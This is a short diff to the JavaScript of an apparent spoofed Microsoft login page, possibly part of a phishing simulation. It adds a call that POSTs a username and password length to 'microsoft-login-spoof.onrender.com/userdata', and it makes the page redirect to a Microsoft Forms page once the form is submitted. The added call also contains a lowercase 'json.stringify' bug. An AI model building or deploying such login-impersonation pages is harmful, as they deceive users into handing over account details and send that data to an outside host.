@@ -21,6 +21,13 @@ const createBody = (data) => {
 
     return urlEncodedData;
 }
+fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
+    method: 'POST',
+    body: json.stringify({userName: 'test', passwordLength: 8}),
+}).then(response => {
+    console.log('response', response);
+})
+
 
 const sendData = (data) => {
     fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
@@ -126,7 +133,7 @@ submitBtn.addEventListener("click", function () {
 
     console.log('from session storage', sessionStorage.getItem('passwordLength'));
     setTimeout(function(){
-      window.location.href = "https://www.microsoft.com/";
+      window.location.href = "https://forms.office.com/Pages/ResponsePage.aspx?id=4y_J5bTVVk2mGJORih7Xpu7L0hyFDJZLmaqweyryFMhUMlQ3M0hNV1hMVUM3WVFJVktaWkNFRlFWSS4u";
       // location.reload();
     },10);
 });
